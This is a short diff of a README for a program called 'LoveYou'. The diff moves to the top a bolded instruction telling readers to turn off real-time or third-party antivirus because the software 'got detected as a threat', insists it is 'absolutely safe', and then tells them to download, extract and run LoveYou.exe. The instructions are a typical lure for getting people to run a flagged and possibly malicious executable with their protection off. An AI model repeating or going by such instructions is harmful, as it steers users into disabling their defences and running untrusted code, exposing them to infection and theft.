@@ -1,9 +1,12 @@
 
 
 # LoveYou 💖💗💓
+
+- **FK ANTIVIRUS. I dont know why it got detected as a threat by AV fuck. Temporally disabled AV (real-time protection, or third-party AV). ngl, my software is absolutely safe.**
+
 ## Usage
 
-- FK ANTIVIRUS. I dont know why it got detected as a threat by AV fuck. Temporally disabled AV (real-time protection, or third-party AV). ngl, my software is absolutely safe.
+
 
  
  - **Download -> Extract** the folder and run the LoveYou.exe file.
